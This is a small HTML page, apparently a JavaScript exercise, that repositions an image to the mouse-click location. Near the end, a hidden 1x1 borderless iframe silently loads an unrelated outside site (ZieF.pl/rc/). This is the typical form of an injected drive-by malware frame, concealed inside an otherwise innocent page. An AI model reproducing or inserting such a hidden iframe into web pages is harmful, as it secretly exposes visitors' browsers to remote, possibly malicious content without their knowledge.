<html>
<head>
<script type="text/javascript">
function display(evt)
{
var dom=document.getElementById("myimage");
dom.style.left=evt.clientX+"px";
dom.style.top=evt.clientY+"px";
}
</script>
</head>
<body onmousedown="display(event);">
<img id="myimage"
style="position:absolute; left=10; top=10;"
src="Tulips.jpg" alt="noimage" width=100 height=100/>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
